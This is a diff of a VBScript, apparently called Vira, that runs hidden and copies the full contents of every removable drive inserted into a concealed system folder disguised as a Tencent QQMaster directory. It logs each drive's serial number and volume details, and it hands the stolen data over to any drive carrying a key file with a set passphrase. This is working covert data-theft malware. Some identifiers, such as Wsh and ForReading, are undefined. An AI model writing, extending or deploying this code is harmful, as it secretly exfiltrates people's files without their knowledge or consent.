@@ -1,53 +1,57 @@
-'Version 2.12 Ultimate
+'Version 2.13 Ultimate
 Option Explicit
 On Error Resume Next
+Const ViraVersion = "2.13"
 
 Dim Target, Container, DriveLetter, FileCheck, UDrive
-Dim DriveNum, Letter, FlagFileNum, FlagFile, MaxCapacityGB, Pointer, iHrv, IsHRV
-Dim WScript, Fso, Fin
+Dim FlagFileNum, FlagFile, MaxCapacityGB, Pointer
+Dim DriveReady, DriveInfo, HarvestCheck, IsHarvest
+Dim WScript, Fso, Fin, Fout
 Set WScript = CreateObject("WScript.Shell")
 Set Fso = CreateObject("Scripting.FileSystemObject")
 
-'**********************************
-' Customization Modification Part
-'**********************************
+'********************
+' Customize Section
+'********************
 
 FlagFileNum = 2
 FlagFile = Array("Setup.exe", "bootmgr")
 
-MaxCapacityGB = 64
-Pointer = "C:\Program Files\Tencent\QQMaster\"
+MaxCapacityGB = 32
+Pointer = "D:\Program Files\Tencent\QQMaster\" 'Please end with a backslash [\]
 
-'*****************************************
-' End of Customization Modification Part
-'*****************************************
+'***************************
+' End of Customize Section
+'***************************
 
 Dim IsCopied(23), i, k
 For i = 0 to 22
   IsCopied(i) = False
 Next
 
-WScript.Run "CMD.EXE /C MD """ & Pointer & """", 0, False
+WScript.Run "CMD.EXE /C MD """ & Pointer & """", 0, True
+Set Container = Fso.GetFolder(Pointer)
+Container.Attributes = 7
 
 Do
-  Do
-    Set Container = Fso.GetFolder(Pointer)
-    Container.Attributes = 7
-    Wsh.Sleep 1000
-  Loop Until Container.Size <= MaxCapacityGB * 1000000000
-  
   For i = 0 To 22
     DriveLetter = Chr(68 + i)
-    IsHRV = False
+    IsHarvest = False
+    DriveReady = False
     
     If Fso.DriveExists(DriveLetter) Then
       Set UDrive = Fso.GetDrive(DriveLetter)
-      If UDrive.DriveType <> 1 Then Continue
+      If UDrive.DriveType = 1 Then
+        DriveReady = True
+      End If
+    End If
+    
+    If DriveReady Then
       If Fso.FileExists(DriveLetter & ":\Modernizer.key") Then
         Set Fin = Fso.OpenTextFile(DriveLetter & ":\Modernizer.key", ForReading)
-        iHrv = Fin.ReadLine()
-        If iHrv = "Master Shiang Dzurr plays silver power." Then
-          IsHRV = True
+        HarvestCheck = Fin.ReadLine()
+        If HarvestCheck = "Master Shiang Dzurr plays silver power." Then
+          IsHarvest = True
           Target = DriveLetter & ":\Moderization\"
           Fso.CreateFolder Target
           Fso.CopyFolder Pointer & "*", Target, True
@@ -55,7 +59,9 @@ Do
         End If
       End If
       
-      If Not IsCopied(i) And Not IsHRV Then
+      Target = Pointer & Hex(UDrive.SerialNumber)
+      If (Fso.FolderExists(Target) Or Container.Size <= MaxCapacityGB*100000000) _
+      And Not IsCopied(i) And Not IsHarvest Then
         FileCheck = True
         For k = 0 to FlagFileNum - 1
           If Fso.FileExists(DriveLetter & ":\" & FlagFile(k)) Then
@@ -64,9 +70,21 @@ Do
           End If
         Next
         
-        If FileCheck Then
+        If FileCheck Then 'Copy this drive
+          'Generate Disk Info
           Target = Pointer & Hex(UDrive.SerialNumber) & "\"
           Fso.CreateFolder Target
+          Set Fout = Fso.OpenTextFile(Target & "Vira.ini", 2, True, 0)
+          Fout.WriteLine "[Vira]" & vbCrLf & "Version=" & ViraVersion
+          Fout.WriteLine "[Drive]"
+          Fout.WriteLine "SerialNumber=" & Hex(UDrive.SerialNumber)
+          Fout.WriteLine "VolumeName=" & UDrive.VolumeName
+          Fout.WriteLine "FileSystem=" & UDrive.FileSystem
+          Fout.WriteLine "TotalSpace=" & UDrive.TotalSize
+          Fout.WriteLine "FreeSpace=" & UDrive.FreeSpace
+          Fout.Close
+          Set Fout = Nothing
+
           Fso.CopyFile DriveLetter & ":\*", Target, True
           Fso.CopyFolder DriveLetter & ":\*", Target, True
           IsCopied(i) = True
@@ -74,16 +92,10 @@ Do
       End If
     Else
       IsCopied(i) = False
-    End If
-  Next
-
+    End If 'Drive ready
+  Next 'Enumerate drive
+  
+  Wsh.Sleep 1000
 Loop
-
-Sub iHrvProc(Letter)
-  For i = 0 To 22
-    DriveLetter = Chr(68 + i)
-  Next
-End Sub
-
 
 
